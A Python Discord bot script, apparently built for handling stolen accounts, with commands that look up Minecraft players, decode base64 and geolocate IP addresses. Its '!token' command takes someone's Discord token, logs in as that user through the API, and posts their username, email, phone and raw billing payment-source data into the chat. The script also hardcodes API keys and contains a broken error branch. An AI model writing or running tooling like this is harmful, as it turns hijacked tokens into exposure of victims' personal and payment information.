import discord
from discord.ext import commands
import requests
import base64

# thanks for the help fmh (freemoneyhub)

intents = discord.Intents.all()
client = commands.Bot(command_prefix='!', intents=intents)
TOKEN = "BOT TOKEN GOES HERE"
hypixel_api_key = "1e91ea2b-4cc6-44c0-8b23-fd6e21bf6d03"  # make sure to update this (/api new)
uslessa2 = int(99999999999)


# when loaded
@client.event
async def on_ready():
    print("bot online love lean fr fr")


@client.command(name='mc')
async def send_data2(ctx, *, mcname):
    randreq = requests.get(f"https://api.hypixel.net/player?key={hypixel_api_key}&name={mcname}")
    player_json = randreq.json()
    if "player" in player_json:
        player_data = player_json["player"]
        mcuid = player_data["uuid"]
        if "lastLogout" in player_data:
            if "socialMedia" in player_data:
                aaa34 = player_data["socialMedia"]
                embed = discord.Embed(title="**MC INFO**", description="", color=0x00ff00)
                embed.set_image(url=f"https://mc-heads.net/body/{mcname}")
                embed.add_field(name="Hypixel",
                                value=f"https://plancke.io/hypixel/player/stats/{mcname} \n https://sky.shiiyu.moe/stats/{mcname} \n https://pitpanda.rocks/players/{mcname}",
                                inline=True)
                embed.add_field(name="Other", value=f"https://namemc.com/search?q={mcname} \n UUID - {mcuid}",
                                inline=False)
                embed.add_field(name="**SOCIALS LAZY AF TO PARSE**", value=aaa34,
                                inline=False)
                embed.set_footer(text=f"STATUS - OFFLINE")
                await ctx.send(embed=embed)
                print(f"SENT DATA FOR {mcname}")
            else:
                embed = discord.Embed(title="**MC INFO**", description="", color=0x00ff00)
                embed.set_image(url=f"https://mc-heads.net/body/{mcname}")
                embed.add_field(name="Hypixel",
                                value=f"https://plancke.io/hypixel/player/stats/{mcname} \n https://sky.shiiyu.moe/stats/{mcname} \n https://pitpanda.rocks/players/{mcname}",
                                inline=True)
                embed.add_field(name="Other", value=f"https://namemc.com/search?q={mcname} \n UUID - {mcuid}",
                                inline=False)
                embed.add_field(name="**SOCIALS LAZY AF TO PARSE**", value="_NULL_",
                                inline=False)
                embed.set_footer(text=f"STATUS - OFFLINE")
                await ctx.send(embed=embed)
                print(f"SENT DATA FOR {mcname}")
        else:
            if "socialMedia" in player_data:
                aaa34 = player_data["socialMedia"]
                embed = discord.Embed(title="**MC INFO**", description="", color=0x00ff00)
                embed.set_image(url=f"https://mc-heads.net/body/{mcname}")
                embed.add_field(name="Hypixel",
                                value=f"https://plancke.io/hypixel/player/stats/{mcname} \n https://sky.shiiyu.moe/stats/{mcname} \n https://pitpanda.rocks/players/{mcname}",
                                inline=True)
                embed.add_field(name="Other", value=f"https://namemc.com/search?q={mcname} \n UUID - {mcuid}",
                                inline=False)
                embed.add_field(name="**SOCIALS LAZY AF TO PARSE**", value=aaa34,
                                inline=False)
                embed.set_footer(text=f"STATUS - ONLINE")
                await ctx.send(embed=embed)
                print(f"SENT DATA FOR {mcname}")
            else:
                embed = discord.Embed(title="**MC INFO**", description="", color=0x00ff00)
                embed.set_image(url=f"https://mc-heads.net/body/{mcname}")
                embed.add_field(name="Hypixel",
                                value=f"https://plancke.io/hypixel/player/stats/{mcname} \n https://sky.shiiyu.moe/stats/{mcname} \n https://pitpanda.rocks/players/{mcname}",
                                inline=True)
                embed.add_field(name="Other", value=f"https://namemc.com/search?q={mcname} \n UUID - {mcuid}",
                                inline=False)
                embed.add_field(name="**SOCIALS LAZY AF TO PARSE**", value="_NULL_",
                                inline=False)
                embed.set_footer(text=f"STATUS - ONLINE")
                await ctx.send(embed=embed)
                print(f"SENT DATA FOR {mcname}")
    else:
        await ctx.send(randreq.text)
        print(f"!MC ERROR {randreq}")


@client.command(name='token')
async def send_data3(penis, *, taken):
    await penis.send(f"Checking {taken}")
    headers = {'Authorization': taken, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if r.status_code == 200:
        user = r.json()["username"]
        discrim = r.json()["discriminator"]
        email = r.json()["email"]
        phone = r.json()["phone"]
        r2 = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
        embed = discord.Embed(title="**DISCORD INFO**", description="", color=0x00ff00)
        embed.add_field(name="-----------------",
                        value=f"""USERNAME : **{user}#{discrim}**
    EMAIL : **{email}**
    Phone : **{phone}**
    """,
                        inline=True)
        await penis.send(embed=embed)
        await penis.send(f"**PAYMENT INFO** \n```{r2.text}```")
        print(f"SENT DATA FOR {user}#{discrim}")
    else:
        await penis.send(r2.text)


@client.command(name='base64')
async def send_data1(ctx4, *, b64):
    data = base64.b64decode(b64)
    await ctx4.send(data)


@client.command(name='geo')
async def send_data4(ctx5, *, z):
    xd = requests.get(f"https://ipinfo.io/{z}?token=8d3562ef3bd184")
    poop = xd.json()['city']
    poop1 = xd.json()['region']
    poop2 = xd.json()['country']
    poop3 = xd.json()['postal']
    poop4 = xd.json()['hostname']
    poop5 = xd.json()['org']
    poop6 = xd.json()['timezone']
    await ctx5.send(
        f"**LOCATION** : {poop}, {poop1}, {poop2}, {poop3} \n**ISP** : {poop4} \n**ORG** : {poop5} \n**TIMEZONE** {poop6}")


client.run(TOKEN)
